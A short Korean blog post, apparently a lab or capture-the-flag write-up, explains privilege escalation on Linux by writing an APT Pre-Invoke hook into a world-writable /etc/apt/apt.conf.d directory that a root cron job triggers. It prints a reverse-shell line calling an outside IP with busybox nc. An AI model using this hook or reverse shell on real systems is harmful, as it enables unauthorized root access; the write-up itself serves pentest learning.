---
layout: post
title: apt-get update 권한상승
subtitle: cron job을 이용한 apt 권한 상승
category: knowledge
thumbnail-img: /assets/img/hazard.jpg
tags: [knowledge, apt-get, crontab, apt, cron]
author: Hong
---
# cron job으로 등록된 apt-get
apt-get이나 apt 명령어가 cron잡에 등록되어서 권한상승으로 이어지는 문제를 풀었다.

예를 들어 다음과 같다.

```bash
cat /etc/crontab

* * * * * root apt-get update
* * * * * root /root/run.sh
```
1분마다 `apt-get update` 명령어가 실행되는데, pre-invoke 스크립트를 특정 디렉토리에 작성하면, apt-get이 실행되기 전에 파일이 실행되어 권한상승에 악용될 수 있다.

# /etc/apt/apt.conf.d/
위 디렉토리에 있는 파일들은 pre-invoke 스크립트로, `apt-get`이나 `apt` 명령어가 실행되면 반드시 먼저 실행된다.

이번 cron 잡의 문제는 이 디렉토리에 쓰기 권한이 있었다는 데 있다.

```bash
franklin@flimsy:/etc/apt/apt.conf.d$ ls -la /etc/apt/
total 40
drwxr-xr-x   7 root root 4096 Jun 30  2022 .
drwxr-xr-x 108 root root 4096 Aug  3  2024 ..
drwxrwxrwx   2 root root 4096 Dec 23 09:20 apt.conf.d
drwxr-xr-x   2 root root 4096 Apr  9  2020 auth.conf.d
drwxr-xr-x   2 root root 4096 Apr  9  2020 preferences.d
-rw-r--r--   1 root root 2717 Jun 15  2022 sources.list
-rw-r--r--   1 root root 2743 Feb 23  2022 sources.list.curtin.old
drwxr-xr-x   2 root root 4096 Jun 30  2022 sources.list.d
-rw-r--r--   1 root root 1188 Jun 30  2022 trusted.gpg
drwxr-xr-x   2 root root 4096 Jun 30  2022 trusted.gpg.d
```
해당 디렉토리로 이동 후 리버스쉘 코드를 내포하는 아래와 같은 형식의 스크립트를 작성한다.

```sh
#!/bin/bash

APT::Update::Pre-Invoke {"busybox nc 192.168.45.159 4444 -e /bin/bash"}
```
파일 이름 맨 앞에 2자리 정수를 붙이는데 이 숫자로 실행 순서를 정할 수 있다.

`02priv` 이런 식으로 정하면 00, 01이 있는 경우 그 다음 실행된다.

# 참고 자료
- https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/
- https://systemweakness.com/code-execution-with-apt-update-in-crontab-privesc-in-linux-e6d6ffa8d076
